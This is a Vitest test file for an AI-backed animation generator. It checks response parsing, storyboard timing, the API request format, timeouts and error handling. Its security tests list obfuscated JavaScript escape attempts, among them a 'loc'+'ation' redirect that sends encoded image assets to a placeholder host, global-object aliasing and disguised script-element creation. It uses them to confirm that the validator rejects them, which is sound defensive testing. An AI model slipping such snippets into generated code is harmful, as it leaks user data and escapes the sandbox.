import { afterEach, describe, expect, it, vi } from 'vitest';
import { generateAnimation, parseAnimationResponse } from '../worker/ai';

const html = '<!doctype html><html><head></head><body><canvas id="stage" width="1920" height="1080"></canvas><script>window.DURATION=10;window.seek=function(t){document.getElementById("stage").getContext("2d").fillRect(t,0,20,20)};</script></body></html>';
const storyboard = [{ id: 'shot-1', title: 'Opening', start: 0, end: 10, description: 'Animated shape' }];
const imageHtml = html.replace('window.DURATION=10;', 'const photo=new Image();photo.src=window.ASSETS["asset-a"];window.READY=photo.decode();window.DURATION=10;')
  .replace('fillRect(t,0,20,20)', 'drawImage(photo,t,0,200,200)');
const response = (text = JSON.stringify({ html, storyboard }), stop_reason = 'end_turn') => ({
  id: 'msg_fixture', type: 'message', role: 'assistant', model: 'claude-opus-5-5',
  content: [{ type: 'text', text }], stop_reason, stop_sequence: null,
  usage: { input_tokens: 10, output_tokens: 20 },
});
afterEach(() => { vi.unstubAllGlobals(); vi.useRealTimers(); });

describe('animation provider validation', () => {
  it('returns complete native Messages output with machine-readable shot timing', () => {
    const result = parseAnimationResponse(response(), 10);
    expect(result.html).toBe(html);
    expect(JSON.parse(result.storyboard)).toEqual(storyboard);
    expect(result.usage).toEqual({ input_tokens: 10, output_tokens: 20 });
  });
  it('rejects token truncation even if the returned JSON happens to be complete', () => {
    expect(() => parseAnimationResponse(response(undefined, 'max_tokens'), 10)).toThrow(/incomplete/i);
  });
  it.each([
    ['globalThis alias and dynamic navigation', 'const host=globalThis;host["loc"+"ation"]="https://example.invalid/?data="+encodeURIComponent(window.ASSETS.photo);'],
    ['self alias', 'const host=self;host["loc"+"ation"]="https://example.invalid/";'],
    ['parent alias', 'const host=parent;host["loc"+"ation"]="https://example.invalid/";'],
    ['top alias', 'const host=top;host["loc"+"ation"]="https://example.invalid/";'],
    ['frames alias', 'const host=frames;host["loc"+"ation"]="https://example.invalid/";'],
    ['window alias', 'const host=window;host["loc"+"ation"]="https://example.invalid/";'],
    ['document alias', 'const page=document;page["loc"+"ation"]="https://example.invalid/";'],
    ['global this', 'const host=this;host["loc"+"ation"]="https://example.invalid/";'],
    ['window returned from a function', 'function getHost(){return window;}'],
    ['document passed as an argument', 'function usePage(page){}usePage(document);'],
    ['window destructuring', 'const {name}=window;'],
    ['document inside an object', 'const data={page:document};'],
    ['window inside an array', 'const data=[window];'],
    ['window outside the canvas contract', 'const other=window.name;'],
    ['document outside the canvas contract', 'const other=document.defaultView;'],
    ['DOM owner document access', 'const other=document.getElementById("stage").ownerDocument;'],
    ['script element creation', 'const tag=document.createElement("script");'],
    ['ambiguous DOM element creation', 'const name=["scr","ipt"].join("");const tag=document.createElement(name);'],
    ['global top outside an unrelated local binding', 'function draw(){const top=20;return top;}const host=top;'],
  ])('rejects %s before saving a runnable animation', (_name, attack) => {
    const unsafe = html.replace('window.DURATION=10;', `${attack}window.DURATION=10;`);
    expect(() => parseAnimationResponse(response(JSON.stringify({ html: unsafe, storyboard })), 10)).toThrow(/canvas environment/i);
  });
  it('preserves direct canvas, image asset and readiness access required by valid generated code', () => {
    const valid = imageHtml.replace('const photo=new Image();', 'const stage=document.getElementById("stage");const scratch=document.createElement("canvas");const ctx=stage.getContext("2d");const palette={window:"navy",self:"cream"};const photo=new Image();');
    expect(parseAnimationResponse(response(JSON.stringify({ html: valid, storyboard })), 10).html).toBe(valid);
  });
  it('preserves lexical top coordinates used by existing generated animations', () => {
    const valid = html.replace('window.DURATION=10;', 'function draw(){const top=20;return top+8;}window.DURATION=10;');
    expect(parseAnimationResponse(response(JSON.stringify({ html: valid, storyboard })), 10).html).toBe(valid);
  });
  it.each([
    ['broken JSON', '{"html":"<canvas'],
    ['missing seek', JSON.stringify({ html: html.replace('window.seek', 'window.other'), storyboard })],
    ['missing closing script', JSON.stringify({ html: html.replace('</script>', ''), storyboard })],
    ['remote script', JSON.stringify({ html: html.replace('<script>', '<script src="https://example.com/a.js">'), storyboard })],
    ['wrong scene timing', JSON.stringify({ html, storyboard: [{ ...storyboard[0], end: 20 }] })],
    ['noncontiguous scenes', JSON.stringify({ html, storyboard: [{ ...storyboard[0], start: 2 }] })],
    ['wrong HTML duration', JSON.stringify({ html: html.replace('DURATION=10', 'DURATION=15'), storyboard })],
    ['invalid JavaScript syntax', JSON.stringify({ html: html.replace('fillRect(t,0,20,20)', 'fillRect(t,0,20,20'), storyboard })],
  ])('rejects %s instead of saving a successful version', (_name, text) => {
    expect(() => parseAnimationResponse(response(text), 10)).toThrow();
  });
  it('sends actual base64 pixels and version context through the native endpoint', async () => {
    let captured: { url: string; body: any; headers: Headers } | undefined;
    vi.stubGlobal('fetch', async (url: string, init: RequestInit) => {
      captured = { url, body: JSON.parse(String(init.body)), headers: new Headers(init.headers) };
      return Response.json(response(JSON.stringify({ html: imageHtml, storyboard })));
    });
    const result = await generateAnimation({ APIMART_API_KEY: 'test-secret' }, {
      prompt: 'Move the product left', aspect: '16:9', duration: 10,
      assets: [{ id: 'asset-a', mediaType: 'image/png', base64: 'aGVsbG8=' }],
      previousHtml: html, selectedShot: 'shot-1',
    });
    expect(result.html).toContain('drawImage(photo');
    expect(result.html).toContain('CMV_STORYBOARD');
    expect(result.html).toContain('"id":"shot-1"');
    expect(captured?.url).toBe('https://api.apimart.ai/v1/messages');
    expect(captured?.headers.get('x-api-key')).toBe('test-secret');
    expect(captured?.body.max_tokens).toBeLessThanOrEqual(16000);
    expect(captured?.body.messages.map((x: any) => x.role)).toEqual(['user', 'assistant', 'user']);
    const edit = captured?.body.messages.at(-1).content;
    expect(edit.find((x: any) => x.type === 'image').source).toEqual({ type: 'base64', media_type: 'image/png', data: 'aGVsbG8=' });
    expect(JSON.stringify(edit)).toContain('shot-1');
    expect(captured?.body.messages[1].content).toContain(html);
  });
  it('does not retry a failed request or expose upstream response details', async () => {
    let requests = 0;
    vi.stubGlobal('fetch', async () => { requests++; return new Response('secret internal account details', { status: 429 }); });
    await expect(generateAnimation({ APIMART_API_KEY: 'test-secret' }, {
      prompt: 'Animate', aspect: '16:9', duration: 10, assets: [],
    })).rejects.toThrow('The animation provider is busy. Please try again later.');
    expect(requests).toBe(1);
  });
  it('rejects output that silently ignores supplied images', async () => {
    vi.stubGlobal('fetch', async () => Response.json(response()));
    await expect(generateAnimation({ APIMART_API_KEY: 'test-secret' }, {
      prompt: 'Animate this product', aspect: '16:9', duration: 10,
      assets: [{ id: 'asset-a', mediaType: 'image/png', base64: 'aGVsbG8=' }],
    })).rejects.toThrow(/uploaded images/i);
  });
  it('reports a bounded timeout instead of leaving a generation pending indefinitely', async () => {
    vi.useFakeTimers();
    vi.stubGlobal('fetch', (_url: string, init: RequestInit) => new Promise((_resolve, reject) => {
      init.signal?.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError')));
    }));
    const result = generateAnimation({ APIMART_API_KEY: 'test-secret' }, {
      prompt: 'Animate', aspect: '16:9', duration: 10, assets: [],
    });
    const assertion = expect(result).rejects.toThrow(/timed out/i);
    await vi.advanceTimersByTimeAsync(180_001);
    await assertion;
    vi.useRealTimers();
  });
});
